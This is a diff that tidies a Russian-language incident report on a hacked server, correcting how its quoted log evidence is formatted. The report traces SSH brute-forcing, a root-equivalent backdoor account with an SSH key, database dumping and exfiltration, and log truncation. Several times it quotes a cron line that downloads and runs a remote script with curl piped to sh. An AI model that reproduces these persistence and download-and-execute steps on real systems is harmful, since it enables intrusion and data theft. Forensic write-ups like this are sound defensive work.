@@ -11,9 +11,9 @@
 - Система фиксирует множественные попытки взлома (`breakin_attempt`), что указывает на агрессивный характер атаки.
 Пример:
 ```
-2016-12-10T00:01:01 | Auth | breakin_attempt | | BREAK-IN | Possible break-in attempt
+2016-12-10T00:01:01 | Auth | breakin_attempt | - | BREAK-IN | Possible break-in attempt
 2016-12-10T00:01:01 | Auth | ssh_invalid_user | ftpuser | 211.72.198.126 | Invalid SSH user
-2016-12-10T00:01:09 | Auth | breakin_attempt | | BREAK-IN | Possible break-in attempt
+2016-12-10T00:01:09 | Auth | breakin_attempt | - | BREAK-IN | Possible break-in attempt
 2016-12-10T00:01:09 | Auth | ssh_invalid_user | admin | 211.72.198.126 | Invalid SSH user
 ```
 
@@ -152,24 +152,24 @@ EDR уточняет, что из созданный пользователь �
 
 | Действие | Доказательство |
 |----------|---------------|
-| Создание учетной записи `svc-backup` с UID 0 (root-эквивалент) | `"2016-12-13T21:28:3 | EDR | "account_created" | "svc-backup" | "-" | "new account created with UID 0 (root equivalent)"` |
-| Добавление SSH-ключа для созданной учетной записи | `"2016-12-13T21:29:3 | EDR | "file_write" | "root" | "-" | "SSH public key added for UID-0 account"` |
-| Добавление задачи в cron для периодического запуска вредоносного скрипта | `"2016-12-13T21:30:0 | EDR | "file_write" | "root" | "-" | "cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh"` |
+| Создание учетной записи `svc-backup` с UID 0 (root-эквивалент) | `2016-12-13T21:28:37 | EDR | account_created | svc-backup | - | new account created with UID 0 (root equivalent)` |
+| Добавление SSH-ключа для созданной учетной записи | `2016-12-13T21:29:39 | EDR | file_write | root | - | SSH public key added for UID-0 account` |
+| Добавление задачи в cron для периодического запуска вредоносного скрипта | `2016-12-13T21:30:05 | EDR | file_write | root | - | cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh` |
 
 ### 3.2. Эксфильтровал данные
 
 | Действие | Доказательство |
 |----------|---------------|
 | Выполнение дампа всех баз данных | `2016-12-14T02:10:03 | Auth | sudo_command | TTY=pts/1 | COMMAND=/usr/bin/mysqldump --all-databases` |
-| Создание архива с дампом (1.85 ГБ) в скрытой директории | `"2016-12-14T02:10:4 | EDR | "file_write" | "root" | "-" | "1.85 GB archive in hidden tmp dir"` |
+| Создание архива с дампом (1.85 ГБ) в скрытой директории | `2016-12-14T02:10:44 | EDR | file_write | root | - | 1.85 GB archive in hidden tmp dir` |
 | Передача архива на внешний сервер | 9 событий `"network_egress"` с пометкой `"large outbound transfer to unrecognised host"` |
 
 ### 3.3. Замел следы
 
 | Действие | Доказательство |
 |----------|---------------|
-| Удаление архива с дампом | `"2016-12-14T02:17:3 | EDR | "file_delete" | "root" | "-" | "staging archive removed after transfer"` |
-| Обрезание логов входа | `"2016-12-14T02:17:4 | EDR | "file_truncate" | "root" | "-" | "login history truncated"` |
+| Удаление архива с дампом | `2016-12-14T02:17:37 | EDR | file_delete | root | - | staging archive removed after transfer` |
+| Обрезание логов входа | `2016-12-14T02:17:49 | EDR | file_truncate | root | - | login history truncated` |
 
 ---
 
@@ -190,7 +190,7 @@ EDR уточняет, что из созданный пользователь �
 
 2. Дамп был успешно упакован в архив размером 1.85 ГБ:
 ```
-"2016-12-14T02:10:4 | EDR | "file_write" | "root" | "-" | "1.85 GB archive in hidden tmp dir
+2016-12-14T02:10:44 | EDR | file_write | root | - | 1.85 GB archive in hidden tmp dir
 ```
 После чего архив был передан на внешний сервер
 
@@ -209,8 +209,8 @@ EDR уточняет, что из созданный пользователь �
 
 **Доказательства:**
 ```
-2016-12-13T21:28:3 | EDR | "account_created" | "svc-backup" | "-" | "new account created with UID 0 (root equivalent)
-2016-12-13T21:29:3 | EDR | "file_write" | "root" | "-" | "SSH public key added for UID-0 account
+2016-12-13T21:28:37 | EDR | account_created | svc-backup | - | new account created with UID 0 (root equivalent)
+2016-12-13T21:29:39 | EDR | file_write | root | - | SSH public key added for UID-0 account
 ```
 
 Это дает злоумышленнику **постоянный доступ в любой момент**, даже если сменить пароль для учетной записи `deploy`.
@@ -219,7 +219,7 @@ EDR уточняет, что из созданный пользователь �
 
 Была добавлена задача, которая периодически скачивает и выполняет скрипт с внешнего сервера:
 ```
-2016-12-13T21:30:0 | EDR | "file_write" | "root" | "-" | "cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh
+2016-12-13T21:30:05 | EDR | file_write | root | - | cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh
 ```
 
 Это обеспечивает постоянный канал для управления и может использоваться для восстановления доступа, даже если основной бэкдор будет обнаружен.
